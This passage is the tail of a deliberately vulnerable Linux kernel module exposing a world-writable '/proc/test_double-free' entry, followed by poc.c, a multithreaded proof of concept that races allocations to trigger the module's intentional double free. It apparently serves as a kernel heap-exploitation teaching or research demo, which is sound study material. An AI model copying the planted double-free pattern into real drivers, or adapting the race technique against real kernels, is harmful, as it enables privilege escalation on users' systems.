            if (!new)
                return -ENOMEM;
            tail = container_of(((struct list_head *)filp->private_data)->prev,
                        struct test_ll, sibling);
            new->buf = tail->buf;
            tail->flag = 1;
            list_add_tail(&new->sibling, filp->private_data);
            return (long)new->buf;
        }
        case 0xa3:  /* double free */
        {
            struct list_head *head = (struct list_head *)filp->private_data;
            struct test_ll *tmp, *next;
            unsigned long i = 0;
            list_for_each_entry_safe(tmp, next, head, sibling) {
                list_del(&tmp->sibling);
                kfree(tmp->buf);
                if (unlikely(tmp->flag))
                    msleep(1);
                kfree(tmp);
            }
            kfree(filp->private_data);
            return 0;
        }
        default:
            return -EINVAL;
        }
    }
    struct file_operations test_ops = {
        .owner = THIS_MODULE,
        .open = test_file_open,
        .unlocked_ioctl = test_file_ioctl,
    };
    static struct proc_dir_entry *test_entry;
    static int __init test_init(void)
    {
        test_entry = proc_create("test_double-free", S_IRUSR | S_IWUSR | S_IROTH |
                        S_IWOTH, NULL, &test_ops);
        if (!test_entry) {
            pr_err("proc_create err\n");
            return -1;
        }
        return 0;
    }
    static void __exit test_exit(void)
    {
        proc_remove(test_entry);
        return;
    }
    MODULE_LICENSE("GPL");
    module_init(test_init);
    module_exit(test_exit);
poc.c
    #define _GNU_SOURCE
    #include 
    #include 
    #include 
    #include 
    #include 
    #include 
    #include 
    #include 
    #include 
    #include 
    #include 
    #include 
    #include 
    #include 
    #include 
    #include 
    static char *target_path = "/proc/test_double-free";
    #define fd_cnt 1
    #define alloc_times 0x100
    int fd[fd_cnt];
    int open_target_file(void)
    {
        return open(target_path, O_RDWR);
    }
    int alloc_8192_buf(int fd)
    {
        return ioctl(fd, 0xa1, NULL);
    }
    int add_same_buf(int fd)
    {
        return ioctl(fd, 0xa2, NULL);
    }
    int do_double_free(int fd)
    {
        return ioctl(fd, 0xa3, NULL);
    }
    int do_release(int fd)
    {
        return ioctl(fd, 0xa3, NULL);
    }
    #define BUF_PER_FD  0x1000
    #define THREADS_RACE    0x10
    int buf_fd[THREADS_RACE];
    int addr[BUF_PER_FD * THREADS_RACE];
    void *thread_alloc_buf(void *arg)
    {
        int idx = (int)arg;
        int i = 0;
        int start = idx * BUF_PER_FD;
        int end = (idx + 1) * BUF_PER_FD;
        for (int i = start; i < end; i++) {
            addr[i] = alloc_8192_buf(buf_fd[idx]);
        }
        return (void *)0;
    }
    int main(int argc, char *argv[])
    {
        int err;
        int i = 0;
        while (1) {
            for (i = 0; i < THREADS_RACE; i++)
                buf_fd[i] = open_target_file();
            int pid;
            if ((pid = fork()) < 0) {
                perror("fork");
            } else if (pid == 0) {
                for (i = 0; i < fd_cnt; i++)
                    fd[i] = open_target_file();
                for (i = 0; i < fd_cnt; i++)
                    for (int j = 0; j < alloc_times; j++)
                        alloc_8192_buf(fd[i]);
                err = add_same_buf(fd[0]);
                fprintf(stderr, "double free at: %x\n", err);
                do_double_free(fd[0]);
                return 0;
            }
            int pid_status;
            pthread_t thread[THREADS_RACE];
            for (i = 0; i < THREADS_RACE; i++) {
                err = pthread_create(&thread[i], NULL,
                            thread_alloc_buf,
                            (void *)i);
                if (err == -1)
                    thread[i] = NULL;
            }
            for (i = 0; i < THREADS_RACE; i++)
                pthread_join(thread[i], NULL);
            waitpid(pid, &pid_status, 0);
            if (WIFEXITED(pid_status)) {
                fprintf(stdout, "child ret: %d\n", pid_status);
                break;
            }
            for (i = 0; i < THREADS_RACE; i++) {
                do_release(buf_fd[i]);
                close(buf_fd[i]);
            }
        }
        for (i = 0; i < THREADS_RACE * BUF_PER_FD; i++) {
            fprintf(stderr, "%d: %x\n", i, addr[i]);
        }
        getchar();
        for (i = 0; i < THREADS_RACE; i++) {
            do_release(buf_fd[i]);
            close(buf_fd[i]);
            buf_fd[i] = -1;
        }
        return 0;
    }
* * *